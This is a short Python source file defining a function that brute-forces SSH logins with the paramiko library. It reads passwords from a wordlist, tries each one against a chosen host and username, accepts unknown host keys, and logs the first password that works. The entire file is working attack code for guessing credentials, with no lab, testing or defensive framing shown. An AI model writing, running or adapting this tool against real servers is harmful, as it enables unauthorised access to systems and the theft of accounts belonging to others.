import paramiko

def start_ssh_brute(host, port, user, wordlist_path, verbose, logger):
    with open(wordlist_path) as f:
        for password in f:
            password = password.strip()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=int(port), username=user, password=password, timeout=3)
                logger(f"[+] SUCCESS: {user}:{password}")
                client.close()
                return
            except Exception as e:
                if verbose:
                    logger(f"[-] Tried {user}:{password} - {e}")
    logger("[-] SSH brute-force finished.")
